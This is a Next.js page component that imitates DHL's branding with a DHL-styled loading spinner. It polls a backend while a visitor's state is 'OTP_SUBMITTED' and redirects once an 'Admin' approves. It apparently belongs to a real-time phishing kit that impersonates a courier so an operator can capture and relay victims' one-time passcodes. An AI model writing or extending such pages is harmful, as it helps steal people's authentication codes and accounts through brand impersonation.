'use client'

import { useEffect, useState, Suspense } from 'react'
import { useRouter, useSearchParams } from 'next/navigation'
import { createClient } from '@/utils/supabase/client'
import { useClientTranslation } from '@/utils/i18n-client'

function WaitingContent() {
    const searchParams = useSearchParams()
    const token = searchParams.get('token')
    const router = useRouter()

    const supabase = createClient()
    const [dots, setDots] = useState('')
    const t = useClientTranslation()

    // UX Loading dots
    useEffect(() => {
        const i = setInterval(() => setDots(p => p.length > 2 ? '' : p + '.'), 500)
        return () => clearInterval(i)
    }, [])

    // Real-Time Subscriptions: The Client holds the connection open, 
    // waiting for Admin to click "Approve" which changes DB state.
    useEffect(() => {
        if (!token) return

        let subscription: any

        // We fetch the ID safely via an API route ideally, or run a poll loop
        // Because of RLS, anon client can't just listen to `clients` where token_hash = xy.
        // We will perform a simple Polling mechanism as a secure fallback. 
        // 1,000 req/day polling every 3 seconds is trivial for Supabase.

        const pollState = async () => {
            const res = await fetch(`/api/client-state?token=${token}`)
            if (res.ok) {
                const data = await res.json()

                // If the State changed from the "waiting" states to the "approved/rejected" states
                // We physically push them back through the middleware, which will route them automatically!
                if (data.state !== 'OTP_SUBMITTED') {
                    router.push(`/track?token=${token}`)
                }
            }
        }

        const interval = setInterval(pollState, 3000)
        return () => clearInterval(interval)

    }, [token, router])

    return (
        <div className="w-full max-w-sm bg-white rounded-lg shadow-xl overflow-hidden border border-gray-100 relative">
            <div className="bg-[#FFCC00] h-2 w-full"></div>
            <div className="p-10 text-center space-y-8">
                {/* DHL Loading Spinner Simulation */}
                <div className="relative w-24 h-24 mx-auto">
                    <div className="absolute inset-0 border-4 border-gray-100 rounded-full"></div>
                    <div className="absolute inset-0 border-8 border-l-[#D40511] border-r-[#D40511] border-t-transparent border-b-transparent rounded-full animate-spin"></div>
                    <div className="absolute inset-0 flex items-center justify-center">
                        <span className="text-[#D40511] font-black italic tracking-tighter text-sm">DHL</span>
                    </div>
                </div>

                <div>
                    <h2 className="text-xl font-black text-gray-900 uppercase tracking-tight">
                        {t('processing')}{dots}
                    </h2>
                    <p className="text-sm text-gray-500 font-medium mt-3 leading-relaxed">
                        {t('auth_verifying')}
                    </p>
                </div>
            </div>
        </div>
    )
}

export default function WaitingPage() {
    return (
        <Suspense fallback={<div className="min-h-screen bg-[#f4f4f4] flex items-center justify-center">Loading...</div>}>
            <WaitingContent />
        </Suspense>
    )
}
